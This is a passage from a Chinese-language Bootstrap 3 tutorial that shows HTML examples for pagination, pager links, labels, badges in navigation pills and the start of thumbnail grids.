class="hljs-string">&quot;#&quot;</span>&gt;</span>5<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span><span class="hljs-symbol">&amp;raquo;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;pagination&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span><span class="hljs-symbol">&amp;laquo;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>4<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>5<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span><span class="hljs-symbol">&amp;raquo;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;pagination pagination-sm&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span><span class="hljs-symbol">&amp;laquo;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>4<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>5<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span><span class="hljs-symbol">&amp;raquo;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="1-4-翻页"><a href="#1-4-翻页" class="headerlink" title="1.4 翻页"></a>1.4 翻页</h3><table><thead><tr><th align="left">Class</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">.pager</td><td align="left">添加该 类 来获得翻页链接。</td></tr><tr><td align="left">.previous, .next</td><td align="left">使用  <code>.previous</code> 把链接向左对齐，使用 <code>.next</code> 把链接向右对齐。</td></tr><tr><td align="left">.disabled</td><td align="left">添加该 类 来设置对应按钮禁止使用。</td></tr></tbody></table><h3 id="默认的翻页"><a href="#默认的翻页" class="headerlink" title="默认的翻页"></a>默认的翻页</h3><h4 id="1-4-1-默认"><a href="#1-4-1-默认" class="headerlink" title="1.4.1 默认"></a>1.4.1 默认</h4><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;pager&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Previous<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Next<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="1-4-2-对齐链接"><a href="#1-4-2-对齐链接" class="headerlink" title="1.4.2 对齐链接"></a>1.4.2 对齐链接</h4><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;pager&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;previous&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span><span class="hljs-symbol">&amp;larr;</span> Older<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;next&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Newer <span class="hljs-symbol">&amp;rarr;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="1-4-3-禁用状态"><a href="#1-4-3-禁用状态" class="headerlink" title="1.4.3 禁用状态"></a>1.4.3 禁用状态</h4><p><code>.disabled</code> 类也可用于翻页中的链接。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;pager&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;previous disabled&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span><span class="hljs-symbol">&amp;larr;</span> Older<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;next&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Newer <span class="hljs-symbol">&amp;rarr;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="2-标签"><a href="#2-标签" class="headerlink" title="2.标签"></a>2.标签</h2><p>标签可用于计数、提示或页面上其他的标记显示。使用  <code>.label</code> 来显示标签。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Example Heading <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;label label-default&quot;</span>&gt;</span>Label<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>Example Heading <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;label label-default&quot;</span>&gt;</span>Label<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>Example Heading <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;label label-default&quot;</span>&gt;</span>Label<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>Example Heading <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;label label-default&quot;</span>&gt;</span>Label<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>可以使用修饰的  <code>label-default</code>、<code>label-primary</code>、<code>label-success</code>、<code>label-info</code>、<code>label-warning</code>、<code>label-danger</code> 来改变标签的外观。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;label label-default&quot;</span>&gt;</span>默认标签<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;label label-primary&quot;</span>&gt;</span>主要标签<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;label label-success&quot;</span>&gt;</span>成功标签<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;label label-info&quot;</span>&gt;</span>信息标签<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;label label-warning&quot;</span>&gt;</span>警告标签<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;label label-danger&quot;</span>&gt;</span>危险标签<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="3-徽章"><a href="#3-徽章" class="headerlink" title="3.徽章"></a>3.徽章</h2><p>徽章（Badges）主要用于突出显示新的或未读的项。徽章与标签相似，主要的区别在于徽章的边角更加圆滑。给链接、导航等元素嵌套 <code>&lt;span class=&quot;badge&quot;&gt;</code> 元素，可以很醒目的展示新的或未读的信息条目。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Inbox <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;badge&quot;</span>&gt;</span>42<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span>&gt;</span><br>  Messages <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;badge&quot;</span>&gt;</span>4<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>如果没有新的或未读的信息条目，也就是说不包含任何内容，徽章组件能够自动隐藏（通过CSS的 <code>:empty</code> 选择符实现) 。</p><h3 id="3-1-导航元素的激活状态"><a href="#3-1-导航元素的激活状态" class="headerlink" title="3.1 导航元素的激活状态"></a>3.1 导航元素的激活状态</h3><p>可以在激活状态的胶囊式导航和列表导航中放置徽章。通过使用 <strong><span class="badge"></strong> 来激活链接。让胶囊式导航内处于激活状态的元素所包含的徽章展示相匹配的样式。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">//1<br><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav nav-pills&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;tablist&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;presentation&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;active&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Home <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;badge&quot;</span>&gt;</span>42<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;presentation&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Profile<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;presentation&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Messages <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;badge&quot;</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><br><br><br>//2<br><span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>胶囊式导航中的激活状态<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav nav-pills&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;active&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>首页<br>            <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;badge&quot;</span>&gt;</span>42<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>简介<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>消息<br>            <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;badge&quot;</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>列表导航中的激活状态<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav nav-pills nav-stacked&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;max-width: 260px;&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;active&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;badge pull-right&quot;</span>&gt;</span>42<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>首页<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>简介<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;badge pull-right&quot;</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>消息<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="4-缩略图"><a href="#4-缩略图" class="headerlink" title="4.缩略图"></a>4.缩略图</h2><p>通过缩略图组件扩展 Bootstrap 的 栅格系统，可以很容易地以网格的方式展示图像、视频、文本等内容。</p><h3 id="4-1-默认样式"><a href="#4-1-默认样式" class="headerlink" title="4.1 默认样式"></a>4.1 默认样式</h3><p>缩略图的默认设计仅需最少的标签就能展示带链接的图片。</p><p>使用 Bootstrap 创建缩略图的步骤如下：</p><ul><li>在图像周围添加带有  <code>.thumbnail</code> 的 <a> 标签。</li><li>这会添加四个像素的内边距（padding）和一个灰色的边框。</li><li>当鼠标悬停在图像上时，会动画显示出图像的轮廓。</li></ul><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;row&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-sm-6 col-md-3&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;thumbnail&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;kittens.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;通用的占位符缩略图&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-sm-6 col-md-3&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;thumbnail&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;kittens.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;通用的占位符缩略图&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-sm-6 col-md-3&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;thumbnail&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;kittens.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;通用的占位符缩略图&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span 